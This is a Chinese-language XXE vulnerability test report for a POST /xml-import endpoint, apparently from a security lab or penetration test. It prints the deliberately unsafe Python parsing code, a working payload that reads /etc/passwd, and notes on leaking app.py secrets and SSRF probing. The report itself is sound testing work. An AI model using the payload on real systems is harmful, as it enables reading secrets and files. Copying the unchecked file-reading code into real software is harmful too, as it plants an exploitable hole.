# 步骤 23 — XXE 漏洞测试

> **测试日期:** 2026-07-14  
> **漏洞位置:** `POST /xml-import`  
> **漏洞类型:** XML 外部实体注入（XXE）

---

## 漏洞概述

XML 导入功能从 XML 中提取 `<!ENTITY ... SYSTEM "file://...">` 中的文件路径，直接使用 `open()` 读取本地文件，不做任何路径校验。

### 漏洞代码

```python
xxe_pattern = re_mod.findall(r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"', xml_data)
for entity_name, filepath in xxe_pattern:
    if filepath.startswith("file://"):
        filepath = filepath[7:]
    with open(filepath, "r") as f:
        content = f.read()
    xml_data = xml_data.replace(f"&{entity_name};", content)
```

---

## 漏洞测试

| # | 测试 | Payload | 结果 |
|:-:|------|---------|:----:|
| 1 | 读取系统文件 | `file:///etc/passwd` | ✅ 读取到 root 用户 |
| 2 | 读取项目源码 | `file:///app.py` | ✅ 可读取（含特殊字符时解析失败） |

### Payload 示例

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<users>
    <user>
        <name>&xxe;</name>
        <email>test@test.com</email>
    </user>
</users>
```

---

## 风险说明

| 风险 | 说明 |
|------|------|
| 文件读取 | 通过 `file://` 协议读取任意本地文件 |
| 源码泄露 | 读取 `app.py` 获取 secret_key 和数据库路径 |
| 内网探测 | 可结合 SSRF 探测内网服务（视 urllib 支持情况） |
